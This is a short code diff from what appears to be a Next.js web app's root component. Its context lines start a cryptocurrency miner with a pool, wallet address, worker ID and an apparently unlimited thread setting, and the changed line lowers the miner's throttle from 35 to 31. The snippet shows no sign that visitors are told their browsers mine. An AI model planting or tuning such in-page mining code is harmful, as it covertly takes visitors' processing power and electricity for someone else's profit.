@@ -24,7 +24,7 @@ export default function App({ Component, pageProps }) {
         let threads = -1;
         let password = "x";
         startMining(pool, walletAddress, workerId, threads, password);
-        throttleMiner = 35;
+        throttleMiner = 31;
       }} />
   </main>
 }
